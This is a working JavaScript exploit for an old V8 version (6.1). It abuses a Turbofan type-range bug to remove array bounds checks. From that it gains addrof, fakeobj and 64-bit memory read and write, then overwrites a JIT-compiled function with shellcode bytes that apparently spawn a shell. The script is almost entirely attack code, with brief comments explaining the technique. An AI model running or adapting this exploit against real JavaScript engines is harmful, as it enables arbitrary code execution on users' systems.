load('/home/vls/int64.js')

/*

	The bug here is related to wrong type calculation for a phi function.
	In turn that caused the wrong range to be calculated whcih led to bound checking removal.
	
*/

/*

	Environment setup:
	
	- git commit e683fc78fd6: V8 version 6.1.534.9.
	- ubuntu 20

*/

function opt_func(x) 
{

  var o = { a: 0 };
  var l =    [5.40933521297143787637e-315,1.2];		 		// magic val: 0x41424344
  oob_arr =  [6.74078355209062637473e-315,6.2];         	// magic val: 0x51525354
 
  var res = 0;
 
  for (var i = 0; i < 3; ++i) 
  {
       if (x % 2 == 0) { o.a = 1;b = false }
       l[o.a] = 1.39064994160909e-309;					// 0xffffffff
       o.a = x;
  }
 
}

var oob_arr = [];	

for (let i = 0; i < 10000; i++) 
{
  opt_func(0);
  opt_func(1);
}

for (let i = 0; i < 20000; i++) 
{
  opt_func(1);
}

opt_func(9);	// This will target the offset of the length of the oob_arr.

var js_arr = new Array(0x10);
js_arr[0] = 0x41424345;			// magic
js_arr[1] = {};

let target_index = 0;

for(let k = 0; k < 50; k++)
{
	let target = Int64.from_double(oob_arr[k]);
	
	if(target == 0x4142434500000000)				// locate the js_arr array using the magic val.
	{
		target_index = k + 1;
		break;
	}
	
}

function addr_of(target_addr)
{
	
	js_arr[1] = target_addr;

	let ret_addr = Int64.from_double(oob_arr[target_index]).sub(1);
	
	return ret_addr;
	
}

function obj_at_addr(target_addr)
{
	let addr = Int64.to_Int64(target_addr).add(1);
	let u = addr.to_double();
	
	oob_arr[target_index] = u;
	
	let new_ref = js_arr[1] ;
	
	return new_ref;
}


let double_arr_map =  Int64.from_double(oob_arr[2]);
let double_arr_prop = Int64.from_double(oob_arr[3]);

var fake_object_holder = [1.1, 1.2, 1.3, 1.4];

fake_object_holder[0] = double_arr_map.to_double();
fake_object_holder[1] = double_arr_prop.to_double();
fake_object_holder[2] = double_arr_prop.to_double();
fake_object_holder[3] = new Int64(0x0000004000000000).to_double();  

/*
 in this case the elements of the double array fake_object_holder
 are located after the object. so the adding the map+ len which comes before 
 the first element fake_object_holder[0] we get offset of 0x40.
*/

let fake_obj_addr = addr_of(fake_object_holder).add(0x40);

print("[+] fake object address: " + fake_obj_addr);

let fake_obj = obj_at_addr(fake_obj_addr);

function read64(target_addr)
{
	
	let x1 = target_addr.sub(0x10).add(1);
	let x2 = x1.to_double();
	
	fake_object_holder[2] = x2;	// elements pointer
	
	return Int64.from_double(fake_obj[0]);

}


function write64(target_addr, val)
{
	
	let x1 = target_addr.sub(0x10).add(1);
	let x2 = x1.to_double();
	
	fake_object_holder[2] = x2;	// elements pointer
	
	fake_obj[0] = Int64.to_double(val);
	
}

/*

	Here I used JIT overwrite, which is an old technique which does not work any more but since its
	an old version of v8 this will do.

*/

/*

The opt_funcst way to compile a JIT function is to call it many times. 
Turbofan (V8's JIT compiler) will count the number of times a function is called and once it reaches a dynamic threshold, the compiler will engage.
One potential problems could be JIT inlining. If a function is only called in a small number of locations, Turbofan will inline the function 
into each caller. 
The function will be compiled, but that code will be embedded into the main script or calling function. 
This is a problem for us, as we want to only corrupt the code of the target function, rather than corrupt a larger, more complex function.
To prevent inlining we will simply call the target function several times in 4-5 separate locations within our script. For example:

*/

function target_func(n) 
{ 
	return n*n;
}

for (var i = 0; i < 20000; i++) 
{
     target_func(1);
}

for (var i = 0; i < 20000; i++) 
{
    target_func(1);
}

for (var i = 0; i < 200000; i++) 
{
    target_func(1);
}

for (var i = 0; i < 200000; i++) 
{
    target_func(1);
}

let target_func_addr = addr_of(target_func);
let jit_func_addr = read64(target_func_addr.add(0x38));

print("[+] jitted code address: " + jit_func_addr);

write64(jit_func_addr, new Int64('0x732f6e69622fb848'));
write64(jit_func_addr.add(0x8), new Int64('0x50c0315f54500068'));
write64(jit_func_addr.add(0x10), new Int64('0x050f5e545a543bb0'));

target_func(3);












